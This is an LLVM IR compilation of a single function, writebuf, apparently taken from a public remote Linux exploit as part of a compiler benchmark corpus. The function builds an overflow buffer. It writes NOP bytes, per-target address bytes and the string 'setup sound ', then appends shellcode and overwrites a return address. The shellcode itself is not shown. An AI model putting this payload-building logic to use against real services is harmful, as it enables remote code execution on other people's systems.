; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_1582.c_writebuf.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_1582.c_writebuf.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_2__ = type { i32, i64 }

@buf = common dso_local global i8* null, align 8
@targets = common dso_local global %struct.TYPE_2__* null, align 8
@n = common dso_local global i64 0, align 8
@.str = private unnamed_addr constant [13 x i8] c"setup sound \00", align 1
@sc = common dso_local global i8* null, align 8

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @writebuf() #0 {
  %1 = alloca i8*, align 8
  %2 = load i8*, i8** @buf, align 8
  store i8* %2, i8** %1, align 8
  %3 = load i8*, i8** @buf, align 8
  %4 = call i32 @memset(i8* %3, i32 144, i32 8)
  %5 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %6 = load i64, i64* @n, align 8
  %7 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %5, i64 %6
  %8 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %7, i32 0, i32 0
  %9 = load i32, i32* %8, align 8
  %10 = ashr i32 %9, 8
  %11 = and i32 %10, 255
  %12 = trunc i32 %11 to i8
  %13 = load i8*, i8** %1, align 8
  %14 = getelementptr inbounds i8, i8* %13, i32 1
  store i8* %14, i8** %1, align 8
  store i8 %12, i8* %13, align 1
  %15 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %16 = load i64, i64* @n, align 8
  %17 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %15, i64 %16
  %18 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %17, i32 0, i32 0
  %19 = load i32, i32* %18, align 8
  %20 = and i32 %19, 255
  %21 = trunc i32 %20 to i8
  %22 = load i8*, i8** %1, align 8
  %23 = getelementptr inbounds i8, i8* %22, i32 1
  store i8* %23, i8** %1, align 8
  store i8 %21, i8* %22, align 1
  %24 = load i8*, i8** %1, align 8
  %25 = call i32 @strlen(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str, i64 0, i64 0))
  %26 = call i32 @memcpy(i8* %24, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str, i64 0, i64 0), i32 %25)
  %27 = call i32 @strlen(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str, i64 0, i64 0))
  %28 = load i8*, i8** %1, align 8
  %29 = sext i32 %27 to i64
  %30 = getelementptr inbounds i8, i8* %28, i64 %29
  store i8* %30, i8** %1, align 8
  %31 = load i8*, i8** %1, align 8
  %32 = getelementptr inbounds i8, i8* %31, i64 120
  store i8* %32, i8** %1, align 8
  %33 = load i8*, i8** %1, align 8
  %34 = load i8*, i8** @sc, align 8
  %35 = load i8*, i8** @sc, align 8
  %36 = call i32 @strlen(i8* %35)
  %37 = call i32 @memcpy(i8* %33, i8* %34, i32 %36)
  %38 = load i8*, i8** @buf, align 8
  %39 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %40 = load i64, i64* @n, align 8
  %41 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %39, i64 %40
  %42 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %41, i32 0, i32 0
  %43 = load i32, i32* %42, align 8
  %44 = sub nsw i32 %43, 10
  %45 = sext i32 %44 to i64
  %46 = getelementptr inbounds i8, i8* %38, i64 %45
  store i8* %46, i8** %1, align 8
  %47 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %48 = load i64, i64* @n, align 8
  %49 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %47, i64 %48
  %50 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %49, i32 0, i32 1
  %51 = load i64, i64* %50, align 8
  %52 = load i8*, i8** %1, align 8
  %53 = bitcast i8* %52 to i64*
  store i64 %51, i64* %53, align 8
  ret void
}

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @memcpy(i8*, i8*, i32) #1

declare dso_local i32 @strlen(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
